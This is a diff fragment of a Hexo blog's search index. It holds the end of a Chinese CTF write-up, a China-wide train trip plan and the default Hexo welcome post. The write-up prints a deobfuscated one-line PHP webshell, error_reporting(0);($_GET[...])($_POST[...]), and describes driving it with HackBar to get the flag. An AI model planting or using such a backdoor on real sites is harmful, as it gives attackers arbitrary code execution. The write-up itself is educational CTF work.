class="variable">$shell</span>;</span><br></pre></td></tr></table></figure>
+
+<p>使用PHPStudy运行后得到：<code>error_reporting(0);($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;]);</code></p>
+<p>接下去开始常规操作，使用HackBar工具，对7d67973a变量GET传参，对9fa3变量POST传参。</p>
+<p><img src="https://s2.loli.net/2023/11/06/ZFbq2TmWALncYBX.png" alt="image.png"></p>
+<p>即可得到Flag为 <strong>flag{53f37ebd-a678-46cc-957b-fd6a3d5b8306}</strong> ，解题完成。</p>
+<p><em>PS. 写到这里突然顿悟了，其实只需要把<code>index.php</code>源码中的<code>eval</code>改为<code>echo</code>，反复运行重复修改即可（如图所示为最后一次的效果），这应该也就是上面那个脚本实现的功能。刚开始做的时候改了一次的效果不明显（文件长度实在太长了，以为没有变化，才会感觉没有头绪），所以一直没有往那个方向去想。这样一想的话，这一题其实也并不是特别难，以后还是要多比较一下解码前后的文件长度才行。</em></p>
+<p><img src="https://s2.loli.net/2023/11/06/2MfFaDeymwi6ptA.png" alt="image.png"></p>
+<h2 id="Jvav"><a href="#Jvav" class="headerlink" title="Jvav"></a>Jvav</h2><p>先看题目，提示说多看看题目名。根据题目名Jvav猜测会和Java有关，结合秘密藏在图片中，应该是隐写类型。</p>
+<p>查阅信息后得到 <strong>Java盲水印(BlindWaterMark)</strong> 这一知识点。</p>
+<p><a href="https://github.com/yxiaojian/blindwatermark">GitHub - Yxiaojian&#x2F;BlindWaterMark: Java盲水印</a></p>
+<p><img src="https://s2.loli.net/2023/11/06/NEhnxqkzMspKLZo.png" alt="image.png"></p>
+<p>在GitHub上搜索可以得到已编译的Java程序，运行即可得到Flag为 <strong>flag{3bb3c3a628a94c}</strong> ，解题完成。</p>
+<p><img src="https://s2.loli.net/2023/11/06/qrePNiy1u7l2dbg.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF-WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>火车纵贯中国 —— 旅行计划</title>
+    <url>/2024/02/17/Train-Travel-Plan/</url>
+    <content><![CDATA[<h1 id="当前阶段可用的方案"><a href="#当前阶段可用的方案" class="headerlink" title="当前阶段可用的方案"></a>当前阶段可用的方案</h1><p><strong>K7042</strong> ：漠河站 至 哈尔滨站 15:32 —— 09:42 (+1) 坐硬座会没小半条命，可接受~</p>
+<p><strong>T244</strong> ：哈尔滨站 至 长春站 10:44 —— 13:16</p>
+<p><strong>Z384</strong> ：长春站 至 海口站 16:53 —— 16:30 (+2) 坐硬座会没命~</p>
+<p><strong>S8105</strong> ：海口站 至 海口东站 18:07 —— 18:32</p>
+<p><strong>C7337</strong> ：海口东站 至 三亚站 19:18 —— 21:05</p>
+<h1 id="20240218"><a href="#20240218" class="headerlink" title="20240218"></a>20240218</h1><p>假如在暑期出发，以天津站为基地，会有重复的区间。</p>
+<p>PlanA：把全程分段，天津站至漠河站、天津站至海口站。</p>
+<p>PlanB：东北区间重复一次。</p>
+<h1 id="准备列表"><a href="#准备列表" class="headerlink" title="准备列表"></a>准备列表</h1><p><strong>运动相机</strong> ：Insta360 GO 3，Insta360 Ace， DJI Osmo Action 4（决赛圈三选一）</p>
+<p><strong>手机</strong> ：Xiaomi 14</p>
+]]></content>
+      <categories>
+        <category>日常</category>
+      </categories>
+      <tags>
+        <tag>旅行</tag>
+        <tag>铁路迷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/02/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
 </search>
